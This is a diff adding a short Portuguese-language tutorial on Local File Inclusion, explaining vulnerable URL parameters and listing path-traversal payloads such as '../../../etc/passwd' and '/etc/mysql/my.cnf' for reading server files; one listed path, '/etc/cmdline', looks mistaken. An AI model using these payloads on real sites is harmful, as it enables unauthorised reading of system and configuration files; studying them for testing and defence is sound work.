@@ -1,0 +1,44 @@
+O LFI(LOCAL FILE INCLUSION) É UMA FALHA QUE OCORRE QUANDO FAZEM A INCLUSÃO DE UM ARQUIVO VIA GET, MAS
+NÃO FAZ O DEVIDO TRATAMENTO, PODENDO ASSIM ALTERAR O ARQUIVO QUE VAI SER REQUISITADO PELA URL, E PODENDO VER ARQUIVOS CONFIDENCIAIS DO PRÓPRIO SERVIDOR.
+	
+	AS URLs QUE PODEM SER VULNERÁVEIS AO LFI NORMALMENTE TEM EM SUA CONSTRUÇÃO PARÂMETROS COMO:
+	'page=', 'param=' 'url=', ETC... TENHA EM MENTE QUE TEM QUE ESTÁ SENDO FEITA ALGUMA
+	REQUISIÇÃO PELA URL.
+
+	
+	EXEMPLO DE URL PARA SER EXPLORADA:
+		
+		https://seusite.com/?page=http://site.com
+		
+	URL ALTERADO PARA EXPLORAÇÃO DE LFI:
+		
+		https://seusite.com/?page=///etc/passwd
+		
+		SE O SITE FOR VUNERÁVEL, A PÁGINA REFLETIRÁ OS DADOS DO ARQUIVO INCLUIDO.
+	
+	CÓDIGOS PARA SEREM USADOS:
+	
+		///etc/passwd
+		
+		../../../etc/passwd
+		
+		/etc/passwd
+		
+		/etc/hosts
+	
+		/etc/group
+	
+		/etc/issue
+		
+		/etc/cmdline
+		
+		/etc/mysql/my.cnf
+	
+	
+	
+
+	EXTRA: 
+		.. : PODE SER USADO PARA VOLTAR PARA UM DIRETÓRIO ANTERIOR.
+		
+		EX: ../../../etc/hosts
+		
